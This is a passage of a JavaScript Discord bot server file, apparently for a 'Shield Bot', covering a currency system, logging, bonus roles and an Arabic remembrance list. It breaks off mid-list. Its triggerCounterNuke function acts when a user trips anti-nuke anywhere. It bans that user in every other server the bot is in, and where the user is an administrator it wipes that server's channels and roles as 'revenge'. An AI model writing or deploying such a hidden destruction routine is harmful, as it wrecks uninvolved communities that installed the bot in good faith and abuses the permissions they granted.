import { GoogleGenAI } from "@google/genai";
import axios from "axios";
import express from "express";
import session from "express-session";
import cookieParser from "cookie-parser";
import SQLiteStore from "better-sqlite3-session-store";
import jwt from "jsonwebtoken";
import { createServer as createViteServer } from "vite";
import nblox from "noblox.js";
import {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ChannelType,
  PermissionFlagsBits,
  AttachmentBuilder,
  SlashCommandBuilder,
  AuditLogEvent,
  Events,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} from "discord.js";
import { createCanvas, loadImage } from "canvas";
import GIFEncoder from "gif-encoder-2";
import db from "./src/lib/db.js";
import dotenv from "dotenv";
import { config } from "./config.js";
dotenv.config();
const DISCORD_TOKEN = process.env.DISCORD_TOKEN || config.discordToken;
const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID || config.clientId;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || config.clientSecret;
const APP_URL = process.env.APP_URL || config.appUrl;
const GEMINI_API_KEY = process.env.GEMINI_API_KEY || config.geminiApiKey;
const JWT_SECRET = process.env.JWT_SECRET || config.jwtSecret;
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction]
});
const PREFIX = "Xb";
import fs from "fs";
import path from "path";
const spamMap = /* @__PURE__ */ new Map();
const raidMap = /* @__PURE__ */ new Map();
const mafiaGames = /* @__PURE__ */ new Map();
const activeGames = /* @__PURE__ */ new Map();
const lastAzkarSent = /* @__PURE__ */ new Map();
const pendingTransfers = /* @__PURE__ */ new Map();
async function logCurrencyTransaction(guildId, userId, amount, reason, type) {
  const settings = db.prepare("SELECT channelId FROM currency_log_settings WHERE guildId = ?").get(guildId);
  if (!settings) return;
  const channel = client.channels.cache.get(settings.channelId);
  if (!channel) return;
  const embed = new EmbedBuilder().setTitle(`\u{1F4B0} Currency Log: ${type.toUpperCase()}`).setDescription(`User: <@${userId}>
Amount: **${amount}** XB
Reason: ${reason}`).setColor(type === "add" ? 65280 : type === "remove" ? 16711680 : 5793266).setTimestamp();
  const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId);
  const balance = userRow?.xb || 0;
  embed.addFields({ name: "New Balance", value: `**${balance}** XB`, inline: true });
  await channel.send({ embeds: [embed] }).catch(() => {
  });
}
async function logEvent(guildId, eventType, data) {
  const settings = db.prepare("SELECT * FROM logging_settings WHERE guildId = ?").get(guildId);
  if (!settings || !settings.channelId) return;
  const columnMap = {
    "messageDelete": "logMessageDelete",
    "messageUpdate": "logMessageEdit",
    "guildMemberAdd": "logMemberJoin",
    "guildMemberRemove": "logMemberLeave",
    "guildMemberUpdate": "logRoleUpdate",
    "channelUpdate": "logChannelUpdate",
    "voiceStateUpdate": "logVoiceState",
    "interactionCreate": "logCommandUsage",
    "levelUp": "logLevelUp",
    "ticketEvent": "logTicketEvents",
    "protectionEvent": "logProtectionEvents",
    "logBotAdd": "logBotAdd"
  };
  const columnName = columnMap[eventType];
  if (columnName && settings[columnName] !== 1) return;
  const channel = client.channels.cache.get(settings.channelId);
  if (!channel) return;
  const embed = new EmbedBuilder().setTitle(data.title).setDescription(data.description).setColor(data.color || 5793266).setTimestamp();
  if (data.fields) embed.addFields(data.fields);
  if (data.thumbnail) embed.setThumbnail(data.thumbnail);
  await channel.send({ embeds: [embed] }).catch(() => {
  });
}
async function triggerCounterNuke(userId, sourceGuildId) {
  console.log(`\u{1F680} Counter-Nuke triggered for user ${userId} from guild ${sourceGuildId}`);
  client.guilds.cache.forEach(async (guild) => {
    try {
      const member = await guild.members.fetch(userId).catch(() => null);
      if (!member) return;
      if (guild.members.me?.permissions.has(PermissionFlagsBits.BanMembers)) {
        await member.ban({ reason: "\u{1F6E1}\uFE0F Counter-Nuke: User triggered Anti-Nuke in another server." }).catch(() => {
        });
      } else if (guild.members.me?.permissions.has(PermissionFlagsBits.KickMembers)) {
        await member.kick("\u{1F6E1}\uFE0F Counter-Nuke: User triggered Anti-Nuke in another server.").catch(() => {
        });
      }
      if (member.permissions.has(PermissionFlagsBits.Administrator) && guild.members.me?.permissions.has(PermissionFlagsBits.Administrator)) {
        console.log(`\u{1F525} Destroying guild ${guild.name} (${guild.id}) as revenge against ${userId}`);
        await guild.setName("\u{1F6E1}\uFE0F SERVER PROTECTED BY SHIELD BOT").catch(() => {
        });
        guild.channels.cache.forEach(async (channel) => {
          await channel.delete("\u{1F6E1}\uFE0F Counter-Nuke: Revenge Mode").catch(() => {
          });
        });
        guild.roles.cache.forEach(async (role) => {
          if (role.id !== guild.id && role.managed === false && role.position < guild.members.me.roles.highest.position) {
            await role.delete("\u{1F6E1}\uFE0F Counter-Nuke: Revenge Mode").catch(() => {
            });
          }
        });
        const newChannel = await guild.channels.create({
          name: "\u{1F6E1}\uFE0F-server-protected",
          type: ChannelType.GuildText,
          topic: "This server was destroyed because its admin tried to nuke another server protected by Shield Bot."
        }).catch(() => null);
        if (newChannel) {
          await newChannel.send({
            embeds: [
              new EmbedBuilder().setTitle("\u{1F6E1}\uFE0F Shield Bot - Revenge Mode").setDescription(`This server has been neutralized because one of its administrators (<@${userId}>) attempted to nuke a server protected by Shield Bot.

**Shield Bot does not tolerate attacks.**`).setColor(16711680).setTimestamp()
            ]
          }).catch(() => {
          });
        }
      }
    } catch (err) {
      console.error(`Error in Counter-Nuke for guild ${guild.id}:`, err);
    }
  });
}
async function getAuditLogExecutor(guild, type) {
  try {
    const auditLogs = await guild.fetchAuditLogs({ limit: 1, type });
    const entry = auditLogs.entries.first();
    if (!entry) return null;
    if (Date.now() - entry.createdTimestamp > 5e3) return null;
    return entry.executor;
  } catch (e) {
    return null;
  }
}
async function checkBonusRoles(guildId, userId) {
  const guild = client.guilds.cache.get(guildId);
  if (!guild) return;
  const member = await guild.members.fetch(userId).catch(() => null);
  if (!member) return;
  const row = db.prepare("SELECT bonus FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId);
  if (!row || row.bonus < 20) return;
  const settings = db.prepare("SELECT maxRoleId, excludedRoleIds, baseRoleId FROM bonus_role_settings WHERE guildId = ?").get(guildId);
  const excludedRoleIds = settings?.excludedRoleIds ? settings.excludedRoleIds.split(",").map((id) => id.trim()) : [];
  const maxRoleId = settings?.maxRoleId;
  const baseRoleId = settings?.baseRoleId;
  let systemRoles = [];
  if (baseRoleId && maxRoleId) {
    const baseRole = guild.roles.cache.get(baseRoleId);
    const maxRole = guild.roles.cache.get(maxRoleId);
    if (baseRole && maxRole) {
      systemRoles = guild.roles.cache.filter((r) => r.position > baseRole.position && r.position <= maxRole.position && !excludedRoleIds.includes(r.id) && !r.managed).sort((a, b) => a.position - b.position).map((r) => r);
    }
  }
  if (systemRoles.length === 0) {
    const roles = db.prepare("SELECT roleId FROM bonus_roles WHERE guildId = ?").all(guildId);
    if (roles.length === 0) return;
    systemRoles = roles.map((r) => guild.roles.cache.get(r.roleId)).filter((r) => r !== void 0 && !excludedRoleIds.includes(r.id) && !r.managed).sort((a, b) => a.position - b.position);
  }
  if (systemRoles.length === 0) return;
  if (baseRoleId && !member.roles.cache.has(baseRoleId)) {
    for (const role of systemRoles) {
      if (member.roles.cache.has(role.id)) {
        await member.roles.remove(role.id).catch(() => {
        });
      }
    }
    return;
  }
  const bonus = row.bonus;
  const targetRoleIndex = Math.floor(bonus / 20) - 1;
  let changed = false;
  let lastAddedRole = null;
  let lastRemovedRole = null;
  for (let i = 0; i < systemRoles.length; i++) {
    const role = systemRoles[i];
    if (i <= targetRoleIndex) {
      if (!member.roles.cache.has(role.id)) {
        await member.roles.add(role.id).catch(() => {
        });
        lastAddedRole = role;
        changed = true;
      }
    } else {
      if (member.roles.cache.has(role.id)) {
        await member.roles.remove(role.id).catch(() => {
        });
        lastRemovedRole = role;
        changed = true;
      }
    }
  }
  if (changed) {
    const logChannelId = db.prepare("SELECT logChannel FROM protection_settings WHERE guildId = ?").get(guildId);
    if (logChannelId?.logChannel) {
      const logChannel = guild.channels.cache.get(logChannelId.logChannel);
      if (logChannel) {
        const embed = new EmbedBuilder().setTitle("\u062A\u062D\u062F\u064A\u062B \u0631\u062A\u0628 \u0627\u0644\u0628\u0648\u0646\u064A\u0633 (Bonus)").setColor(65280).setTimestamp();
        if (lastAddedRole && lastRemovedRole) {
          embed.setDescription(`\u062A\u0645 \u062A\u062D\u062F\u064A\u062B \u0631\u062A\u0628 ${member} (Bonus: ${bonus})`);
        } else if (lastAddedRole) {
          embed.setDescription(`\u062D\u0635\u0644 ${member} \u0639\u0644\u0649 \u0631\u062A\u0628\u0629 ${lastAddedRole} (Bonus: ${bonus})`);
        } else if (lastRemovedRole) {
          embed.setDescription(`\u062A\u0645\u062A \u0625\u0632\u0627\u0644\u0629 \u0631\u062A\u0628\u0629 ${lastRemovedRole} \u0645\u0646 ${member} (Bonus: ${bonus})`);
        }
        logChannel.send({ embeds: [embed] }).catch(() => {
        });
      }
    }
  }
}
async function awardXB(guildId, userId, amount, reason) {
  db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(userId, guildId, amount, amount);
  await logCurrencyTransaction(guildId, userId, amount, reason, "add");
}
async function deductXB(guildId, userId, amount, reason) {
  const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId);
  const currentBalance = userRow?.xb || 0;
  const newBalance = Math.max(0, currentBalance - amount);
  db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = ?").run(userId, guildId, newBalance, newBalance);
  await logCurrencyTransaction(guildId, userId, amount, reason, "remove");
}
async function syncCurrencyFromLogs() {
  console.log("Starting currency sync from logs...");
  const guilds = client.guilds.cache;
  for (const [guildId, guild] of guilds) {
    const settings = db.prepare("SELECT channelId FROM currency_log_settings WHERE guildId = ?").get(guildId);
    if (!settings) continue;
    const channel = await client.channels.fetch(settings.channelId).catch(() => null);
    if (!channel || channel.type !== ChannelType.GuildText) continue;
    try {
      const messages = await channel.messages.fetch({ limit: 500 });
      const balances = /* @__PURE__ */ new Map();
      for (const msg of messages.values()) {
        if (!msg.embeds || msg.embeds.length === 0) continue;
        const embed = msg.embeds[0];
        const userMatch = embed.description?.match(/User: <@!?(\d+)>/);
        if (!userMatch) continue;
        const userId = userMatch[1];
        if (balances.has(userId)) continue;
        const balanceField = embed.fields.find((f) => f.name === "New Balance");
        if (!balanceField) continue;
        const balanceMatch = balanceField.value.match(/\*\*(\d+)\*\* XB/);
        if (!balanceMatch) continue;
        const balance = parseInt(balanceMatch[1]);
        balances.set(userId, balance);
      }
      for (const [userId, balance] of balances) {
        db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = ?").run(userId, guildId, balance, balance);
      }
      console.log(`Synced ${balances.size} users in guild ${guild.name}`);
    } catch (err) {
      console.error(`Failed to sync guild ${guildId}:`, err);
    }
  }
}
const AZKAR_LIST = [
  "\u0633\u0628\u062D\u0627\u0646 \u0627\u0644\u0644\u0647 \u0648\u0628\u062D\u0645\u062F\u0647\u060C \u0633\u0628\u062D\u0627\u0646 \u0627\u0644\u0644\u0647 \u0627\u0644\u0639\u0638\u064A\u0645",
  "\u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0627\u0644\u0644\u0647 \u0648\u062D\u062F\u0647 \u0644\u0627 \u0634\u0631\u064A\u0643 \u0644\u0647\u060C \u0644\u0647 \u0627\u0644\u0645\u0644\u0643 \u0648\u0644\u0647 \u0627\u0644\u062D\u0645\u062F \u0648\u0647\u0648 \u0639\u0644\u0649 \u0643\u0644 \u0634\u064A\u0621 \u0642\u062F\u064A\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0635\u0644 \u0648\u0633\u0644\u0645 \u0639\u0644\u0649 \u0646\u0628\u064A\u0646\u0627 \u0645\u062D\u0645\u062F",
  "\u0623\u0633\u062A\u063A\u0641\u0631 \u0627\u0644\u0644\u0647 \u0648\u0623\u062A\u0648\u0628 \u0625\u0644\u064A\u0647",
  "\u0644\u0627 \u062D\u0648\u0644 \u0648\u0644\u0627 \u0642\u0648\u0629 \u0625\u0644\u0627 \u0628\u0627\u0644\u0644\u0647",
  "\u0627\u0644\u062D\u0645\u062F \u0644\u0644\u0647 \u0631\u0628 \u0627\u0644\u0639\u0627\u0644\u0645\u064A\u0646",
  "\u0627\u0644\u0644\u0647 \u0623\u0643\u0628\u0631",
  "\u0633\u0628\u062D\u0627\u0646 \u0627\u0644\u0644\u0647",
  "\u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0627\u0644\u0644\u0647",
  "\u0633\u0628\u062D\u0627\u0646 \u0627\u0644\u0644\u0647 \u0648\u0628\u062D\u0645\u062F\u0647 \u0639\u062F\u062F \u062E\u0644\u0642\u0647\u060C \u0648\u0631\u0636\u0627 \u0646\u0641\u0633\u0647\u060C \u0648\u0632\u0646\u0629 \u0639\u0631\u0634\u0647\u060C \u0648\u0645\u062F\u0627\u062F \u0643\u0644\u0645\u0627\u062A\u0647",
  "\u0627\u0644\u0644\u0647\u0645 \u0623\u0646\u062A \u0631\u0628\u064A \u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0623\u0646\u062A\u060C \u062E\u0644\u0642\u062A\u0646\u064A \u0648\u0623\u0646\u0627 \u0639\u0628\u062F\u0643\u060C \u0648\u0623\u0646\u0627 \u0639\u0644\u0649 \u0639\u0647\u062F\u0643 \u0648\u0648\u0639\u062F\u0643 \u0645\u0627 \u0627\u0633\u062A\u0637\u0639\u062A\u060C \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u0635\u0646\u0639\u062A\u060C \u0623\u0628\u0648\u0621 \u0644\u0643 \u0628\u0646\u0639\u0645\u062A\u0643 \u0639\u0644\u064A\u060C \u0648\u0623\u0628\u0648\u0621 \u0628\u0630\u0646\u0628\u064A \u0641\u0627\u063A\u0641\u0631 \u0644\u064A \u0641\u0625\u0646\u0647 \u0644\u0627 \u064A\u063A\u0641\u0631 \u0627\u0644\u0630\u0646\u0648\u0628 \u0625\u0644\u0627 \u0623\u0646\u062A",
  "\u0631\u0636\u064A\u062A \u0628\u0627\u0644\u0644\u0647 \u0631\u0628\u0627\u064B\u060C \u0648\u0628\u0627\u0644\u0625\u0633\u0644\u0627\u0645 \u062F\u064A\u0646\u0627\u064B\u060C \u0648\u0628\u0645\u062D\u0645\u062F \u0635\u0644\u0649 \u0627\u0644\u0644\u0647 \u0639\u0644\u064A\u0647 \u0648\u0633\u0644\u0645 \u0646\u0628\u064A\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0639\u0644\u0645\u0627\u064B \u0646\u0627\u0641\u0639\u0627\u064B\u060C \u0648\u0631\u0632\u0642\u0627\u064B \u0637\u064A\u0628\u0627\u064B\u060C \u0648\u0639\u0645\u0644\u0627\u064B \u0645\u062A\u0642\u0628\u0644\u0627\u064B",
  "\u064A\u0627 \u062D\u064A \u064A\u0627 \u0642\u064A\u0648\u0645 \u0628\u0631\u062D\u0645\u062A\u0643 \u0623\u0633\u062A\u063A\u064A\u062B \u0623\u0635\u0644\u062D \u0644\u064A \u0634\u0623\u0646\u064A \u0643\u0644\u0647 \u0648\u0644\u0627 \u062A\u0643\u0644\u0646\u064A \u0625\u0644\u0649 \u0646\u0641\u0633\u064A \u0637\u0631\u0641\u0629 \u0639\u064A\u0646",
  "\u062D\u0633\u0628\u064A \u0627\u0644\u0644\u0647 \u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0647\u0648 \u0639\u0644\u064A\u0647 \u062A\u0648\u0643\u0644\u062A \u0648\u0647\u0648 \u0631\u0628 \u0627\u0644\u0639\u0631\u0634 \u0627\u0644\u0639\u0638\u064A\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0628\u0643 \u0623\u0635\u0628\u062D\u0646\u0627 \u0648\u0628\u0643 \u0623\u0645\u0633\u064A\u0646\u0627 \u0648\u0628\u0643 \u0646\u062D\u064A\u0627 \u0648\u0628\u0643 \u0646\u0645\u0648\u062A \u0648\u0625\u0644\u064A\u0643 \u0627\u0644\u0646\u0634\u0648\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0645\u0627 \u0623\u0635\u0628\u062D \u0628\u064A \u0645\u0646 \u0646\u0639\u0645\u0629 \u0623\u0648 \u0628\u0623\u062D\u062F \u0645\u0646 \u062E\u0644\u0642\u0643 \u0641\u0645\u0646\u0643 \u0648\u062D\u062F\u0643 \u0644\u0627 \u0634\u0631\u064A\u0643 \u0644\u0643\u060C \u0641\u0644\u0643 \u0627\u0644\u062D\u0645\u062F \u0648\u0644\u0643 \u0627\u0644\u0634\u0643\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0639\u0627\u0641\u0646\u064A \u0641\u064A \u0628\u062F\u0646\u064A\u060C \u0627\u0644\u0644\u0647\u0645 \u0639\u0627\u0641\u0646\u064A \u0641\u064A \u0633\u0645\u0639\u064A\u060C \u0627\u0644\u0644\u0647\u0645 \u0639\u0627\u0641\u0646\u064A \u0641\u064A \u0628\u0635\u0631\u064A\u060C \u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0623\u0646\u062A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0643\u0641\u0631 \u0648\u0627\u0644\u0641\u0642\u0631\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0639\u0630\u0627\u0628 \u0627\u0644\u0642\u0628\u0631\u060C \u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0623\u0646\u062A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u0639\u0641\u0648 \u0648\u0627\u0644\u0639\u0627\u0641\u064A\u0629 \u0641\u064A \u0627\u0644\u062F\u0646\u064A\u0627 \u0648\u0627\u0644\u0622\u062E\u0631\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u0639\u0641\u0648 \u0648\u0627\u0644\u0639\u0627\u0641\u064A\u0629 \u0641\u064A \u062F\u064A\u0646\u064A \u0648\u062F\u0646\u064A\u0627\u064A \u0648\u0623\u0647\u0644\u064A \u0648\u0645\u0627\u0644\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u0633\u062A\u0631 \u0639\u0648\u0631\u0627\u062A\u064A \u0648\u0622\u0645\u0646 \u0631\u0648\u0639\u0627\u062A\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u062D\u0641\u0638\u0646\u064A \u0645\u0646 \u0628\u064A\u0646 \u064A\u062F\u064A \u0648\u0645\u0646 \u062E\u0644\u0641\u064A \u0648\u0639\u0646 \u064A\u0645\u064A\u0646\u064A \u0648\u0639\u0646 \u0634\u0645\u0627\u0644\u064A \u0648\u0645\u0646 \u0641\u0648\u0642\u064A \u0648\u0623\u0639\u0648\u0630 \u0628\u0639\u0638\u0645\u062A\u0643 \u0623\u0646 \u0623\u063A\u062A\u0627\u0644 \u0645\u0646 \u062A\u062D\u062A\u064A",
  "\u064A\u0627 \u062D\u064A \u064A\u0627 \u0642\u064A\u0648\u0645 \u0628\u0631\u062D\u0645\u062A\u0643 \u0623\u0633\u062A\u063A\u064A\u062B \u0623\u0635\u0644\u062D \u0644\u064A \u0634\u0623\u0646\u064A \u0643\u0644\u0647 \u0648\u0644\u0627 \u062A\u0643\u0644\u0646\u064A \u0625\u0644\u0649 \u0646\u0641\u0633\u064A \u0637\u0631\u0641\u0629 \u0639\u064A\u0646",
  "\u0623\u0635\u0628\u062D\u0646\u0627 \u0648\u0623\u0635\u0628\u062D \u0627\u0644\u0645\u0644\u0643 \u0644\u0644\u0647 \u0648\u0627\u0644\u062D\u0645\u062F \u0644\u0644\u0647\u060C \u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0627\u0644\u0644\u0647 \u0648\u062D\u062F\u0647 \u0644\u0627 \u0634\u0631\u064A\u0643 \u0644\u0647\u060C \u0644\u0647 \u0627\u0644\u0645\u0644\u0643 \u0648\u0644\u0647 \u0627\u0644\u062D\u0645\u062F \u0648\u0647\u0648 \u0639\u0644\u0649 \u0643\u0644 \u0634\u064A\u0621 \u0642\u062F\u064A\u0631",
  "\u0631\u0628 \u0623\u0633\u0623\u0644\u0643 \u062E\u064A\u0631 \u0645\u0627 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u064A\u0648\u0645 \u0648\u062E\u064A\u0631 \u0645\u0627 \u0628\u0639\u062F\u0647 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u064A\u0648\u0645 \u0648\u0634\u0631 \u0645\u0627 \u0628\u0639\u062F\u0647",
  "\u0631\u0628 \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0643\u0633\u0644 \u0648\u0633\u0648\u0621 \u0627\u0644\u0643\u0628\u0631\u060C \u0631\u0628 \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0639\u0630\u0627\u0628 \u0641\u064A \u0627\u0644\u0646\u0627\u0631 \u0648\u0639\u0630\u0627\u0628 \u0641\u064A \u0627\u0644\u0642\u0628\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0639\u0627\u0644\u0645 \u0627\u0644\u063A\u064A\u0628 \u0648\u0627\u0644\u0634\u0647\u0627\u062F\u0629 \u0641\u0627\u0637\u0631 \u0627\u0644\u0633\u0645\u0627\u0648\u0627\u062A \u0648\u0627\u0644\u0623\u0631\u0636\u060C \u0631\u0628 \u0643\u0644 \u0634\u064A\u0621 \u0648\u0645\u0644\u064A\u0643\u0647\u060C \u0623\u0634\u0647\u062F \u0623\u0646 \u0644\u0627 \u0625\u0644\u0647 \u0625\u0644\u0627 \u0623\u0646\u062A\u060C \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0646\u0641\u0633\u064A \u0648\u0645\u0646 \u0634\u0631 \u0627\u0644\u0634\u064A\u0637\u0627\u0646 \u0648\u0634\u0631\u0643\u0647\u060C \u0648\u0623\u0646 \u0623\u0642\u062A\u0631\u0641 \u0639\u0644\u0649 \u0646\u0641\u0633\u064A \u0633\u0648\u0621\u0627\u064B \u0623\u0648 \u0623\u062C\u0631\u0647 \u0625\u0644\u0649 \u0645\u0633\u0644\u0645",
  "\u0628\u0633\u0645 \u0627\u0644\u0644\u0647 \u0627\u0644\u0630\u064A \u0644\u0627 \u064A\u0636\u0631 \u0645\u0639 \u0627\u0633\u0645\u0647 \u0634\u064A\u0621 \u0641\u064A \u0627\u0644\u0623\u0631\u0636 \u0648\u0644\u0627 \u0641\u064A \u0627\u0644\u0633\u0645\u0627\u0621 \u0648\u0647\u0648 \u0627\u0644\u0633\u0645\u064A\u0639 \u0627\u0644\u0639\u0644\u064A\u0645",
  "\u0623\u0639\u0648\u0630 \u0628\u0643\u0644\u0645\u0627\u062A \u0627\u0644\u0644\u0647 \u0627\u0644\u062A\u0627\u0645\u0627\u062A \u0645\u0646 \u0634\u0631 \u0645\u0627 \u062E\u0644\u0642",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0647\u0645 \u0648\u0627\u0644\u062D\u0632\u0646\u060C \u0648\u0627\u0644\u0639\u062C\u0632 \u0648\u0627\u0644\u0643\u0633\u0644\u060C \u0648\u0627\u0644\u0628\u062E\u0644 \u0648\u0627\u0644\u062C\u0628\u0646\u060C \u0648\u0636\u0644\u0639 \u0627\u0644\u062F\u064A\u0646\u060C \u0648\u063A\u0644\u0628\u0629 \u0627\u0644\u0631\u062C\u0627\u0644",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u062C\u0639\u0644 \u0641\u064A \u0642\u0644\u0628\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u0641\u064A \u0628\u0635\u0631\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u0641\u064A \u0633\u0645\u0639\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u0639\u0646 \u064A\u0645\u064A\u0646\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u0639\u0646 \u064A\u0633\u0627\u0631\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u0641\u0648\u0642\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u062A\u062D\u062A\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u0623\u0645\u0627\u0645\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u062E\u0644\u0641\u064A \u0646\u0648\u0631\u0627\u064B\u060C \u0648\u0627\u062C\u0639\u0644 \u0644\u064A \u0646\u0648\u0631\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0638\u0644\u0645\u062A \u0646\u0641\u0633\u064A \u0638\u0644\u0645\u0627\u064B \u0643\u062B\u064A\u0631\u0627\u064B\u060C \u0648\u0644\u0627 \u064A\u063A\u0641\u0631 \u0627\u0644\u0630\u0646\u0648\u0628 \u0625\u0644\u0627 \u0623\u0646\u062A\u060C \u0641\u0627\u063A\u0641\u0631 \u0644\u064A \u0645\u063A\u0641\u0631\u0629 \u0645\u0646 \u0639\u0646\u062F\u0643 \u0648\u0627\u0631\u062D\u0645\u0646\u064A \u0625\u0646\u0643 \u0623\u0646\u062A \u0627\u0644\u063A\u0641\u0648\u0631 \u0627\u0644\u0631\u062D\u064A\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u062E\u0637\u064A\u0626\u062A\u064A \u0648\u062C\u0647\u0644\u064A \u0648\u0625\u0633\u0631\u0627\u0641\u064A \u0641\u064A \u0623\u0645\u0631\u064A \u0648\u0645\u0627 \u0623\u0646\u062A \u0623\u0639\u0644\u0645 \u0628\u0647 \u0645\u0646\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u062C\u062F\u064A \u0648\u0647\u0632\u0644\u064A \u0648\u062E\u0637\u0626\u064A \u0648\u0639\u0645\u062F\u064A \u0648\u0643\u0644 \u0630\u0644\u0643 \u0639\u0646\u062F\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0645\u0627 \u0642\u062F\u0645\u062A \u0648\u0645\u0627 \u0623\u062E\u0631\u062A \u0648\u0645\u0627 \u0623\u0633\u0631\u0631\u062A \u0648\u0645\u0627 \u0623\u0639\u0644\u0646\u062A \u0648\u0645\u0627 \u0623\u0646\u062A \u0623\u0639\u0644\u0645 \u0628\u0647 \u0645\u0646\u064A\u060C \u0623\u0646\u062A \u0627\u0644\u0645\u0642\u062F\u0645 \u0648\u0623\u0646\u062A \u0627\u0644\u0645\u0624\u062E\u0631 \u0648\u0623\u0646\u062A \u0639\u0644\u0649 \u0643\u0644 \u0634\u064A\u0621 \u0642\u062F\u064A\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0632\u0648\u0627\u0644 \u0646\u0639\u0645\u062A\u0643\u060C \u0648\u062A\u062D\u0648\u0644 \u0639\u0627\u0641\u064A\u062A\u0643\u060C \u0648\u0641\u062C\u0627\u0621\u0629 \u0646\u0642\u0645\u062A\u0643\u060C \u0648\u062C\u0645\u064A\u0639 \u0633\u062E\u0637\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0641\u062A\u0646\u0629 \u0627\u0644\u0646\u0627\u0631 \u0648\u0639\u0630\u0627\u0628 \u0627\u0644\u0646\u0627\u0631\u060C \u0648\u0641\u062A\u0646\u0629 \u0627\u0644\u0642\u0628\u0631 \u0648\u0639\u0630\u0627\u0628 \u0627\u0644\u0642\u0628\u0631\u060C \u0648\u0645\u0646 \u0634\u0631 \u0641\u062A\u0646\u0629 \u0627\u0644\u063A\u0646\u0649\u060C \u0648\u0645\u0646 \u0634\u0631 \u0641\u062A\u0646\u0629 \u0627\u0644\u0641\u0642\u0631\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0641\u062A\u0646\u0629 \u0627\u0644\u0645\u0633\u064A\u062D \u0627\u0644\u062F\u062C\u0627\u0644",
